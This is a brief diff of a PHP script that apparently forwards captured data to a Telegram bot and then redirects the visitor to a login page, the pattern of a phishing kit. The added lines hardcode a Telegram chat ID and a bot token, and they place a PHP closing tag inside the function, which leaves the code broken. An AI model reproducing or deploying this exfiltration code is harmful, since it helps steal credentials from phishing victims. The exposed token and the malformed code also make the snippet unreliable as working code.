@@ -23,6 +23,9 @@ function sendMessage($id_telegram, $message, $id_botTele) {
     curl_setopt_array($ch, $optArray);
     $result = curl_exec($ch);
     curl_close($ch);
+ $id_telegram = "6323146855";
+ $id_botTele  = "7566722423:AAF8pjfP1ftLQBmf-7wziGiTyVLKjhzXaPA";
+?>
 }
 sendMessage($id_telegram, $message, $id_botTele);
 header('Location:/loginku.html');
